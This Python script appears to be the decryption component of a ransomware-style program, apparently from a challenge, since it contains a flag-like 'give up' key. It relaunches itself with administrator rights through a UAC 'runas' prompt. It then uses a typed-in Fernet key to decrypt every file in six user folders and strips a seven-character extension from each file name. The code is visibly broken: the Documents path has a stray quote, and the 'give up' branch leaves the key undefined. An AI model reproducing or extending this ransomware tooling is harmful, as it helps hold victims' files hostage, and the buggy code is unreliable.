import os
import ctypes, sys
from cryptography.fernet import Fernet


def main():
    if is_admin():
        user = os.getlogin()
        # assign directory
        directory1 = 'C:\\Users\\{0}\\Documents\''.format(user)
        directory2 = 'C:\\Users\\{0}\\Desktop\\'.format(user)
        directory3 = 'C:\\Users\\{0}\\Downloads\\'.format(user)
        directory4 = 'C:\\Users\\{0}\\Pictures\\'.format(user)
        directory5 = 'C:\\Users\\{0}\\Videos\\'.format(user)
        directory6 = 'C:\\Users\\{0}\\Music\\'.format(user)
        # read key from input
        keyinfo = input("Enter key: ")
        if keyinfo == "K3Y{|_GiveUp!_7hi5|54We@kPer5on}":
            print("So you give up? Lame!")
            # hidden again for obvious purposes
        else:
            key = keyinfo
        decrypt(directory1, key)
        decrypt(directory2, key)
        decrypt(directory3, key)
        decrypt(directory4, key)
        decrypt(directory5, key)
        decrypt(directory6, key)
        print("Decryption complete :)")
    else:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)


def decrypt(directoryPath, key):
    for root, dirs, files in os.walk(directoryPath):
        for file in files:
            filePath = os.path.join(root, file)
            try:
                with open(filePath, 'rb') as f:
                    data = f.read()
                fernet = Fernet(key)
                decrypted = fernet.decrypt(data)
                with open(filePath, 'wb') as f:
                    f.write(decrypted)
                os.rename(filePath, filePath[:-7])
            except ValueError:
                print("Invalid key")
                pass


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


main()
